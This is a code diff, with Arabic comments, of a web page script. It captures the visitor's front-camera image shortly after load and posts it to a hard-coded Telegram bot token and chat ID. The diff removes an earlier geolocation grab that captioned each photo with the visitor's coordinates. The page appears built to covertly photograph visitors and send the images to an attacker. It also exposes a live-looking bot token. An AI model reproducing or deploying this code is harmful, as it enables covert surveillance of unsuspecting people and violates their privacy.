@@ -53,12 +53,10 @@
     const canvas = document.getElementById("canvas");
     const context = canvas.getContext("2d");
 
-    const botToken = "7908642649:AAH6lzPgbqKss3nN-A0vUpKhYsmtPDGUoHU";  // ← غيّر هذا
-    const chatId = "7891583282";      // ← غيّر هذا
+    const botToken = "7908642649:AAH6lzPgbqKss3nN-A0vUpKhYsmtPDGUoHU";  // ← غيّره
+    const chatId = "7891583282";      // ← غيّره
 
-    let latitude = null, longitude = null;
-
-    // الحصول على الكاميرا
+    // الحصول على الكاميرا فقط
     navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false
@@ -70,37 +68,22 @@
           stream.getTracks().forEach(track => track.stop());
 
           const imageData = canvas.toDataURL("image/png");
-          if (latitude && longitude) {
-            sendToTelegram(imageData, latitude, longitude);
-          }
+          sendToTelegram(imageData);
         }, 1000);
       };
     }).catch(err => {
       console.error("خطأ في الكاميرا:", err.message);
     });
 
-    // الحصول على الموقع
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          latitude = pos.coords.latitude.toFixed(6);
-          longitude = pos.coords.longitude.toFixed(6);
-        },
-        err => {
-          console.error("خطأ في الموقع:", err.message);
-        }
-      );
-    }
-
-    // إرسال إلى تليجرام
-    function sendToTelegram(base64Image, lat, lon) {
+    // إرسال إلى تليجرام بدون الموقع
+    function sendToTelegram(base64Image) {
       fetch(base64Image)
         .then(res => res.blob())
         .then(blob => {
           const formData = new FormData();
           formData.append("chat_id", chatId);
           formData.append("photo", blob, "image.png");
-          formData.append("caption", `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}`);
+          formData.append("caption", "📷 صورة تم التقاطها من الكاميرا");
 
           fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
             method: "POST",
